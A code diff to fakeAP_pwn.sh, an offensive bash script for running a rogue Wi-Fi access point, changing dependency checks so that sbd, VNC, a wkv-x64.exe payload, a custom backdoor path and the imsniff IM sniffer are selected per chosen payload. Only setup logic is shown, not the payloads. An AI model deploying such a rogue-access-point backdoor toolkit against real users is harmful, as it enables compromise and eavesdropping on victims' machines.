@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh v0.3 (Beta-#54 2010-07-27)                                                     #
+# fakeAP_pwn.sh v0.3 (Beta-#55 2010-07-27)                                                     #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -47,7 +47,7 @@ export          verbose=0                            # 0/1/2      - Verbose mode
 export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
 export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
 export      port=`shuf -i 2000-65000 -n 1`
-export   version="0.3 (Beta-#54)"
+export   version="0.3 (Beta-#55)"
 trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"
 
 #----Functions---------------------------------------------------------------------------------#
@@ -414,31 +414,38 @@ if ! test -e /usr/sbin/apache2 ; then
       echo -e "\e[01;33m[i]\e[00m Install apache2 & php5"
    fi
 fi
-if ! test -e /usr/local/bin/sbd ; then
-   echo -e "\e[00;31m[-]\e[00m dhcpd3 isn't installed."
-   read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
-   if [[ $REPLY =~ ^[Yy]$ ]] ; then
-      command=$(apt-get -y install sbd)
-   fi
+if [ "$payload" == "sbd" ] ; then
    if ! test -e /usr/local/bin/sbd ; then
-      echo -e "\e[00;31m[-]\e[00m Failed to install sbd" 1>&2;
-      cleanup;
-   else
-      echo -e "\e[01;33m[i]\e[00m Install sbd"
+      echo -e "\e[00;31m[-]\e[00m sbd isn't installed."
+      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
+      if [[ $REPLY =~ ^[Yy]$ ]] ; then
+         command=$(apt-get -y install sbd)
+      fi
+      if ! test -e /usr/local/bin/sbd ; then
+         echo -e "\e[00;31m[-]\e[00m Failed to install sbd" 1>&2;
+         cleanup;
+      else
+         echo -e "\e[01;33m[i]\e[00m Install sbd"
+      fi
    fi
-fi
-if ! test -e /usr/bin/vncviewer ; then
-   echo -e "\e[00;31m[-]\e[00m vnc isn't installed."
-   read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
-   if [[ $REPLY =~ ^[Yy]$ ]] ; then
-      command=$(apt-get -y install vnc)
-   fi
+elif [ "$payload" == "vnc" ] ; then
    if ! test -e /usr/bin/vncviewer ; then
-      echo -e "\e[00;31m[-]\e[00m Failed to install vnc" 1>&2;
-      cleanup;
-   else
-      echo -e "\e[01;33m[i]\e[00m Install vnc"
+      echo -e "\e[00;31m[-]\e[00m vnc isn't installed."
+      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
+      if [[ $REPLY =~ ^[Yy]$ ]] ; then
+         command=$(apt-get -y install vnc)
+      fi
+      if ! test -e /usr/bin/vncviewer ; then
+         echo -e "\e[00;31m[-]\e[00m Failed to install vnc" 1>&2;
+         cleanup;
+      else
+         echo -e "\e[01;33m[i]\e[00m Install vnc"
+      fi
    fi
+elif [ "$payload" == "wkv" ] ; then
+   if ! [ -e "$www/wkv-x64.exe" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a wkv-x64.exe at $www/wkv-x64.exe." 1>&2; cleanup; fi
+else
+   if ! [ -e "$backdoorPath" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a backdoor at $backdoorPath." 1>&2; cleanup; fi
 fi
 if ! test -e /opt/metasploit3/bin/msfconsole ; then
    echo -e "\e[00;31m[-]\e[00m Metasploit isn't installed."
@@ -456,10 +463,21 @@ if ! test -e /opt/metasploit3/bin/msfconsole ; then
       echo -e "\e[01;33m[i]\e[00m Install metasploit"
    fi
 fi
-if [ "$payload" == "other" ] ;   then
-   if ! [ -e "$backdoorPath" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a backdoor at $backdoorPath." 1>&2; cleanup; fi
+if [ "$extras" == "true" ] ; then
+   if ! test -e /usr/bin/imsniff ; then
+      echo -e "\e[00;31m[-]\e[00m imsniff isn't installed."
+      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
+      if [[ $REPLY =~ ^[Yy]$ ]] ; then
+         command=$(apt-get -y install imsniff)
+      fi
+      if ! test -e /usr/bin/imsniff ; then
+         echo -e "\e[00;31m[-]\e[00m Failed to install imsniff" 1>&2;
+         cleanup;
+      else
+         echo -e "\e[01;33m[i]\e[00m Install imsniff"
+      fi
+   fi
 fi
-#if ! test -e /usr/bin/imsniff ;  then echo -e "\e[00;31m[-]\e[00m imsniff isn't installed. Try: apt-get install imsniff" 1>&2; cleanup; fi
 
 if ! test -e "$www/index.php"; then
    if test -d "www/"; then
